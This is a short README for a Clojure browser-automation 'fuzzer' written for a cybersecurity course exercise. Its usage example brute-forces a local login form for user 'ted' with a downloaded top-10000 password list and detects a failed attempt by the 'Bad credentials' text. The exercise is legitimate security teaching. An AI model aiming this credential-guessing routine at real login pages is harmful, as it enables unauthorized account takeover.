# browser-fuzzer

clj-webdriver based fuzzer

Used to solve HY Cybersecurity MOOC problem:
https://cybersecuritybase.github.io/securing/part4.html
Assignment 1: Hack my password 

## Usage

REPL

e.g.

```clojure
(fuzz-site-p {:site "http://localhost:8080/login"
                :user-field {:name "username"}
                :pass-field {:name "password"}
                :submit-field {:name "submit"}
                :username "ted"
                :pass-seq  (str/split-lines (slurp "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_10000.txt"))
                :error-fn #(str/includes? (t/html % "body") "Bad credentials")})
```

Tested with:
* Firefox 46.0.1 (newer version may not work)
* Ubuntu 16.04

## License

Copyright © 2016 FIXME

Distributed under the Eclipse Public License either version 1.0 or (at
your option) any later version.
